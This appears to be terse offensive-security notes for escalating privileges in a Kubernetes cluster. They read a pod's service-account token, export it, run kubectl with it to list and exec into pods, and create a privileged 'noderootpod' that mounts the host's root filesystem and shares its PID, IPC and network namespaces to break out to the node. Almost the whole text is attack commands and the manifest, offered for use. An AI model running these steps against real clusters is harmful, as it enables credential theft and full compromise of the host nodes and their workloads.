`/var/run/secrets/kubernetes.io/serviceaccount/token`
export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNZXZQZjhPZUt...
$ ./kubectl get po --token=$TOKEN
$ ./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- bash
https://github.com/kvaps/kubectl-node-shell
https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/

cat <<EOF | ./kubectl create --token=$TOKEN -f -
```
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```EOF